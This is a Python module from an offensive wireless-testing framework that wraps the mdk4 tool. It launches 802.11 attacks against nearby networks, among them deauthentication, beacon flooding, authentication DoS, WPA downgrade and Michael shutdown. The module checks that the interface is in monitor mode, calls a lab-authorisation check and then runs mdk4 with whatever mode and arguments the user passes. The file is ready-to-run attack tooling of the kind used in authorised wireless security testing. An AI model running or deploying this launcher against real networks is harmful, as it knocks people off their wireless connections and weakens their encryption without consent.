"""Bridge to ``mdk4`` (vanhoef/mdk4) — modern successor to mdk3 for aggressive 802.11 tests.

Passes through interface, mode, and mode-specific flags. Lab-only; requires local binary.

Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""

from __future__ import annotations

import shutil
import subprocess

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab, warn_pmf_ios


class Exploit(Exploit):
    """mdk4 subprocess launcher."""

    __info__ = {
        "name": "mdk4 attack bridge",
        "description": "Runs mdk4 <iface> <mode> [options]. Common modes: d (deauth/disassoc), "
                       "b (beacon flood), a (auth DoS), p (probing), g (WPA downgrade), "
                       "m (Michael shutdown). See mdk4 --help <mode>.",
        "authors": ("André Henrique (@mrhenrike)",),
        "references": (
            "https://github.com/vanhoef/mdk4",
            "https://en.wikipedia.org/wiki/IEEE_802.11w-2009",
        ),
        "devices": ("Linux monitor interface + injection",),
    }

    interface = OptString("", "Monitor-mode interface")
    mode = OptString("d", "mdk4 mode (single letter)")
    mode_args = OptString(
        "",
        "Space-separated args after mode (e.g. '-w a -B blacklist.txt' for mode d)",
    )
    dry_run = OptBool(False, "Print command only, do not execute")


    def check(self) -> str:
        """Verify wireless interface is in monitor mode and ready."""
        import shutil
        import subprocess
        iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
        if shutil.which("iwconfig"):
            try:
                out = subprocess.check_output(
                    ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if "Monitor" in out:
                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
                if "no wireless extensions" not in out.lower():
                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
            except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                pass
        if shutil.which("iw"):
            try:
                out = subprocess.check_output(
                    ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                ).decode("utf-8", "replace")
                if str(iface) in out:
                    return f"Interface {iface} detected via iw - verify monitor mode"
            except Exception:
                pass
        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"

    def run(self) -> None:
        require_authorised_lab()
        if str(self.mode).lower().startswith("d"):
            warn_pmf_ios()

        exe = shutil.which("mdk4")
        if not exe:
            print_error("mdk4 not found in PATH. Build from https://github.com/vanhoef/mdk4")
            return
        if not self.interface:
            print_error("Set interface.")
            return

        cmd = [exe, self.interface, str(self.mode).strip()[:1]]
        rest = str(self.mode_args).strip()
        if rest:
            cmd.extend(rest.split())

        print_status("mdk4: {}".format(" ".join(cmd)))
        if self.dry_run:
            return
        try:
            subprocess.run(cmd, check=False)
        except KeyboardInterrupt:
            print_status("Stopped.")
